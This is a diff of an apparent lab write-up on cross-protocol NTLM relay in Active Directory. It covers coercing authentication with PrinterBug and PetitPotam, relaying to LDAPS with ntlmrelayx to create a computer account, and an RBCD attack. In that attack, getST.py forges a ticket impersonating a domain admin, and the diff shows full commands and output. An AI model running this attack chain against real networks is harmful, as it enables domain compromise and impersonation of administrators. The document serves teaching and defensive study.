@@ -151,9 +151,10 @@ start-service webclient
 ```
 Please note that if the webclient is installed but not running, there are some techniques that allow to enable the service, for example [placing a "Documents.searchConnector-ms” on a share](https://tradecraft.cafe/Windows-Search-And-WebDAV-Payloads/) (out of scope here).
 
-For our next step, how can we force an authentication over HTTP? Please remember that one of the ways to have a successful relay to LDAP service is to "come from" HTTP, of which WebDAV is an extension.
+For our next step, how can we force an authentication over HTTP? Please remember that one of the ways to have a successful relay to LDAP service is to "come from" HTTP protocol, of which WebDAV is an extension.
 
-An attacker can try to coerce client authentication by using RPC calls with some techniques that started to be relevant in 2018. The first issue to become widely used was called “PrinterBug”: it is an authenticated method (i.e., an attacker needs to already have domain credentials) for getting a server running the Print Spooler service to initiate an NTLMv2 authentication session (using its Machine Account credentials) with a server of the attacker's choosing. 
+An attacker can try to coerce client authentication by using RPC calls with some techniques that started to be relevant in 2018. The first issue to become widely used was called “PrinterBug”: it is a “feature” within the Windows Print System Remote Protocol that allows a host to query another host, asking for an update on a print job.
+It is an authenticated method (i.e., an attacker needs to already have domain credentials) for getting a server running the Print Spooler service to initiate an NTLMv2 authentication session (using its Machine Account credentials) with a server of the attacker's choosing. 
 
 In 2021, the PetitPotam tool was released, utilizing a similar vulnerability in the service MS-EFSRPC (Encrypting File System Remote Protocol). Please note that the researchers also found two vulnerabilites (CVE-2021-36943 AND CVE-2022-26925) that allowed unauthenticated coercion. This meant that an attacker without any credentials could force a vulnerable server to connect to the relay server. To make things worse, Domain Controllers were vulnerable to the unauthenticated attack by default. As you can imagine, the un-authenticated version of the attack has been already patched, but still this kind of attack is quite relevant in the authenticated flavour.
 
@@ -197,8 +198,10 @@ This is what happens on the attacker machine, on the left the mitm6 tool's conso
 We just saw an example of a successfull cross-protocol NTLM relay attack from an unauthenticated standpoint, since actual credentials of users were never used in the attack.
 
 ## Appendix
-In this section of the document I'll briefly analyze two other attacks described in the sources.
-
+In this section of the document I'll briefly analyze two other attacks described in the original resources. Since more than one month has passed from the original report creation, the "grace period" of Windows machines has expired and they keep rebooting every hour. One of the problems encountered was that the victim's WebClient service would not auto-restart, so I've given the following command as privileged user in elevated PowerShell:
+```
+PS C:\Windows\system32> Set-Service -Name WebClient -StartupType Automatic
+```
 ### Attack 3 LDAP(S)
 LDAPS (Lightweight Directory Access Protocol over SSL) is a secure version of LDAP that encrypts the communication between the client and the LDAP server using SSL/TLS.
 The default domain policy allow users to domain-join up to 10 new computer objects, this of course can be changed but often is not the case.
@@ -207,7 +210,7 @@ What we need is the "ntlmrelayx" tool in execution with:
 ```
 ntlmrelayx.py -t ldaps://10.0.0.100 --add-computer carlotrustedpc
 ```
-And, when we leverage the PetitPotam tool to coerce the victim (with webservice client running) to authenticate to the attacker by using the very same command shown before, we get:
+When we leverage the PetitPotam tool to coerce the victim (with webservice client running) to authenticate to the attacker by using the very same command shown before, we get:
 ```
 [*] Servers started, waiting for connections
 [*] HTTPD(80): Connection from 10.0.0.2 controlled, attacking target ldaps://10.0.0.100
@@ -221,12 +224,21 @@ We just got a username and related password of a freshly created computer accoun
 Please note that to coerce authentication from the victim, for convenience we used the PetitPotam tool requiring the credentials of the victim, but keep in mind that in some environments you could use the un-authenticated flavour or just use mitm6 tool as shown in section 2B.
 
 ### Attack 4 Resource Based Constrained Delegation (RBCD)
-For this attack we'll move into Kerberos territory; RBCD in extreme synthesis is about configuring some systems in Active Directory to be allowed to request Kerberos tickets on behalf of other users (more details can be found [here](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)).
-The attribute msDS-AllowedToActOnBehalfOfOtherIdentity contains a value that represents an object we trust for any authentication originated from it. 
-For example, if SRV02 has its attribute msDS-AllowedToActOnBehalfOfOtherIdentity set to srv01, this means that srv02 trusts authentications coming from srv01. 
+For this attack we'll move into Kerberos territory; in extreme synthesis RBCD allows services to impersonate users when accessing resources on behalf of those users. Unlike traditional delegation, RBCD is configured on the resource's account, specifying which accounts can delegate to it (more details can be found [here](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)).
+
+The attribute msDS-AllowedToActOnBehalfOfOtherIdentity has to be set on the resource's account, it contains a value that represents an object that is trusted for any authentication originated from it. 
 Please note that any computer account is able to set this property on itself.
-Essentially, if we can relay a computer account (that is allowed to add additional computers to the domain) to LDAPS, we can compromise the relayed computer by impersonating a domain admin on the relayed computer (aka the victim).
-This time we use the delegate-access flag for the command:
+For example, if SRV02 has its attribute msDS-AllowedToActOnBehalfOfOtherIdentity set to srv01, this means that srv02 trusts authentications coming from srv01. 
+
+This has a tremendous security implication: if we can relay to LDAPS an account that is allowed to add additional computers to the domain, we can compromise the relayed computer by impersonating a domain admin on the relayed computer (aka the victim).
+What happens under the hood is that:
+- as before ntlmrelayx intercepts NTLM authentication requests and relays to LDAPS
+- the tool authenticates to the LDAP server as the relayed user/machine account (e.g., NTLMLAB/VICTIM$)
+- A new computer account (e.g., newlycreatedpc$) is created in the target domain
+- The msDS-AllowedToActOnBehalfOfOtherIdentity attribute of VICTIM$ is updated to allow newlycreatedpc$ to impersonate other users
+- newlycreatedpc$ can now use Kerberos delegation (S4U2Proxy) to impersonate users when accessing resources on VICTIM$.
+
+Lets see all this in practice, this time we use the delegate-access flag for the command, that does all the hard work for us :
 ```
 ntlmrelayx.py -t ldaps://10.0.0.100 --delegate-access
 ```
@@ -242,16 +254,41 @@ And we get :
 [*] XIWARFUV$ can now impersonate users on VICTIM$ via S4U2Proxy
 [*] HTTPD(80): Connection from 10.0.0.2 controlled, but there are no more targets left!
 ```
-We will then be able to use S4U2Self and S4U2Proxy to request a ticket granting ticket on behalf of the administrator towards the relayed machine, effectively compromising it. 
-Please keep in mind that our attacker machine is not domain joined, and we did not set the DNS server to point to the domain controller. Kerberos needs FQDN instead of ip so we will need to either :
-- set the DNS server in our ethernet config
-- or change /etc/hosts adding records for the victim and DC addresses using FQDN (respectively victim.ntlmlab.local and ntlmlab.local)
+We will now be able to use Kerberos delegation from the newly created "XIWARFUV" computer account to request a ticket granting ticket (TGT) on behalf of the administrator working only on the relayed machine.
+Lets  see this in action, we will use another script of the "impacket" suite called "getST.py".
 
-We can now use another "impacket" tool called "getST.py" which stands for "Get Service Ticket".
+Please keep in mind that our attacker machine is not domain joined, and we did not set the DNS server to point to the domain controller. Since Kerberos needs FQDN instead of ip address, we will need to either :
+- set the DNS server in our ethernet config
+- or change /etc/hosts adding records for the victim and DC addresses using FQDN as you can see below.
+  
 ```
-getST.py -spn cifs/victim.ntlmlab.local 'ntlmlab.local/XIWARFUV$' -impersonate domainadmin
+jean@attacker:~/workshop/PetitPotam$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	attacker
+10.0.0.2        victim.ntlmlab.local
+10.0.0.10	srv01.ntlmlab.local
+10.0.0.100	ntlmlab.local
 ```
-We now have a TGT issued for the domainadmin user to use only on the victim machine. We need to import it on our krb5ccname variable to use it for kerberos authentication.
+We can now lauch the command:
+```
+getST.py -spn cifs/victim.ntlmlab.local 'ntlmlab.local/XIWARFUV$:7$gtW2be-1<bhPx' -impersonate domainadmin
+```
+Lets analyze the parameters given:
+- spn: Specifies the Service Principal Name (SPN) for which the service ticket is requested, in this case cifs/victim.ntlmlab.local the file service on the target machine victim.ntlmlab.local
+- 'ntlmlab.local/XIWARFUV$:7$gtW2be-1<bhPx': The account requesting the service ticket and the password separated by colon (:)
+- impersonate domainadmin: The user that XIWARFUV$ wants to impersonate is "domainadmin" a high-privilege account
+
+The output is:
+```
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating domainadmin
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in domainadmin.ccache
+```
+The TGT ticket issued for the domainadmin user to use only on the victim machine is saved on disk in the folder we're using at the moment. We need to import it on our krb5ccname variable to use it for kerberos authentication.
 ```
 export KRB5CCNAME=domainadmin.ccache
 ```
